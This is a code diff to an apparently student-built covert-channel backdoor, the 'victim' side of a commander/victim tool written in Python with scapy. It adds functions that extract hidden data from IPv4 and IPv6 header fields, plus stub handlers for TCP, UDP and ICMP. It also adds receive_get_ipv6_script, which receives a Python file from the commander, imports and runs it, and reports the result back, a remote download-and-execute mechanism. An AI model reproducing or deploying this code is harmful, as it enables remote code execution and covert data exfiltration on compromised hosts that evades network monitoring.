@@ -4,6 +4,9 @@ import os
 import queue
 import socket
 import sys
+
+from scapy.layers.inet6 import IPv6
+
 import constants
 import importlib
 import inotify.adapters
@@ -51,10 +54,16 @@ def parse_arguments():
 
 def initialize_server_socket(source_ip: str, source_port: int):
     """
+    Initializes the server socket.
 
-    :param source_ip:
-    :param source_port:
-    :return:
+    @param source_ip:
+        A string containing the server's IP address
+
+    @param source_port:
+        An integer representing the server's port number
+
+    @return: server_socket
+        A socket with the binded information
     """
     try:
         # Create a socket object
@@ -199,7 +208,6 @@ def remove_file(file_path: str):
 def watch_file(client_socket: socket.socket,
                file_path: str,
                signal_queue: queue.Queue):
-
     # Create an inotify object
     notifier = inotify.adapters.Inotify()
     print("[+] WATCHING FILE: Now watching the following file: {}".format(file_path))
@@ -281,7 +289,7 @@ def watch_file(client_socket: socket.socket,
 
 
 def __bin_to_bytes(binary_string):
-    return bytes(int(binary_string[i:i+8], 2) for i in range(0, len(binary_string), 8))
+    return bytes(int(binary_string[i:i + 8], 2) for i in range(0, len(binary_string), 8))
 
 
 def covert_data_write_to_file(covert_data: str, filename: str):
@@ -321,11 +329,45 @@ def get_protocol_header_function_map():
         ("IPv4", "Header Checksum"): extract_data_ipv4_header_chksum,
         ("IPv4", "Source Address"): extract_data_ipv4_src_addr,
         ("IPv4", "Destination Address"): extract_data_ipv4_dst_addr,
-        ("IPv4", "Options"): extract_data_ipv4_options,
-        ("IPv4", "Padding"): "F()",
 
         # b) IPv6 Handlers
+        ("IPv6", "Version"): "F()",
+        ("IPv6", "Traffic Class"): "F()",
+        ("IPv6", "Flow Label"): "F()",
+        ("IPv6", "Payload Length"): "F()",
+        ("IPv6", "Next Header"): "F()",
+        ("IPv6", "Hop Limit"): "F()",
+        ("IPv6", "Source Address"): "F()",
+        ("IPv6", "Destination Address"): "F()",
+
+        # c) TCP Handlers
+        ("TCP", "Source Port"): "F()",
+        ("TCP", "Destination Port"): "F()",
+        ("TCP", "Sequence Number"): "F()",
+        ("TCP", "Acknowledgement Number"): "F()",
+        ("TCP", "Header Length"): "F()",
+        ("TCP", "Reserved"): "F()",
+        ("TCP", "Flags"): "F()",
+        ("TCP", "Window Size"): "F()",
+        ("TCP", "Urgent Pointer"): "F()",
+        ("TCP", "Options"): "F()",
+
+        # d) UDP Handlers
+        ("UDP", "Source Port"): "F()",
+        ("UDP", "Destination Port"): "F()",
+        ("UDP", "Length"): "F()",
+        ("UDP", "Checksum"): "F()",
+
+        # e) ICMP Handlers
+        ("ICMP", "Type (Type of Message)"): "F()",
+        ("ICMP", "Code"): "F()",
+        ("ICMP", "Checksum"): "F()",
+        ("ICMP", "Identifier"): "F()",
+        ("ICMP", "Sequence Number"): "F()",
+        ("ICMP", "Timestamp"): "F()",
     }
+
+# ===================== IPV4 EXTRACT COVERT DATA FUNCTIONS =====================
 
 
 def extract_data_ipv4_ttl(packet):
@@ -443,7 +485,7 @@ def extract_data_ipv4_total_length(packet):
         A string containing binary data from DS field
     """
     if packet.haslayer('IP'):
-        covert_data= packet[IP].len
+        covert_data = packet[IP].len
         binary_data = format(covert_data, constants.SIXTEEN_BIT)
         return binary_data
 
@@ -463,7 +505,7 @@ def extract_data_ipv4_identification(packet):
         A string containing binary data from DS field
     """
     if packet.haslayer('IP'):
-        covert_data= packet[IP].id
+        covert_data = packet[IP].id
         binary_data = format(covert_data, constants.SIXTEEN_BIT)
         return binary_data
 
@@ -582,6 +624,9 @@ def extract_data_ipv4_dst_addr(packet):
     A handler function to extract data from packets with IPv4
     header and a modified source address field.
 
+    @attention Functionality Disabled
+        This is not used
+
     @note Bit length
         The source address field for IPv4 headers is 32 bits (4 bytes)
 
@@ -606,13 +651,90 @@ def extract_data_ipv4_dst_addr(packet):
         return binary_data
 
 
-def extract_data_ipv4_options(packet):
+# ===================== IPV6 EXTRACT COVERT DATA FUNCTIONS =====================
+
+
+def __is_valid_ipv6(address: str):
+    try:
+        ipaddress.IPv6Address(address)
+        return True
+    except ipaddress.AddressValueError as e:
+        print(constants.INVALID_IPV6_ERROR.format(e))
+        return False
+
+
+def receive_get_ipv6_script(client_socket: socket.socket, client_ip: str, client_port: int):
     """
-    A handler function to extract data from packets with IPv4
-    header and an options (Timestamp) field.
+    Get ipv6_getter.py from commander, executes the script and sends over
+    IPv6 address and port.
+
+    @param client_socket:
+        The commander socket
+
+    @param client_ip:
+        A string containing the commander's IP address
+
+    @param client_port:
+        A string containing the commander's port number
+
+    @return: ipv6, port
+        A tuple containing the IPv6 address and port number
+        of the executing host machine
+    """
+    # Get the file name from Commander
+    file_path = client_socket.recv(1024).decode()
+    file_name = file_path.split(".")[0]  # => Must be without .py extension for importing
+
+    # Receive File if exists (MUST DO: put in downloads/[client_ip])
+    with open(file_path, "wb") as file:
+        eof_marker = constants.FILE_END_OF_FILE_SIGNAL  # Define the end-of-file marker
+
+        while True:
+            file_data = client_socket.recv(1024)
+            if not file_data:
+                break  # No more data received
+            if file_data.endswith(eof_marker):
+                file.write(file_data[:-len(eof_marker)])  # Exclude the end-of-file marker
+                break
+            else:
+                file.write(file_data)
+
+    # Perform Import and Run Function to get IPv6
+    if is_file_openable(file_path):
+        print(constants.TRANSFER_SUCCESS_MSG.format(file_path))
+
+        # Import module and get IPv6 address
+        if is_importable(file_name):
+            get_ipv6 = importlib.import_module(file_name)
+            ipv6, port = get_ipv6.determine_ipv6_address()  # Run function inside script
+
+            if __is_valid_ipv6(ipv6):
+                print(constants.IPV6_FOUND_MSG.format(ipv6))
+                client_socket.send((constants.VICTIM_ACK + "/" + ipv6 + "/" + port).encode())  # Transfer Result
+                os.remove(file_path)
+                return ipv6, port
+            else:
+                print(constants.IPV6_OPERATION_ERROR)
+                client_socket.send(constants.IPV6_ERROR_MSG_TO_CMDR.encode())
+                os.remove(file_path)
+                return None, None
+        else:
+            client_socket.send(constants.IMPORT_IPV6_SCRIPT_ERROR.format(file_path).encode())
+            os.remove(file_path)
+            return None, None
+    else:
+        client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
+        os.remove(file_path)
+        return None, None
+
+
+def extract_data_ipv6_version(packet):
+    """
+    A handler function to extract data from packets with IPv6
+    header and a modified version field.
 
     @note Bit length
-        The timestamp options field for IPv4 headers is set to 4 bits
+        The version field for IPv6 headers is 4 bits
 
     @param packet:
         The received packet
@@ -620,9 +742,7 @@ def extract_data_ipv4_options(packet):
     @return binary_data:
         A string containing binary data from DS field
     """
-    if IPOption in packet:
-        timestamp_value = packet.getlayer(IPOption).timestamp
-        binary_data = format(timestamp_value, constants.FOUR_BIT)
+    if IPv6 in packet:
+        version = packet[IPv6].version
+        binary_data = format(version, constants.FOUR_BIT)
         return binary_data
-    else:
-        return None
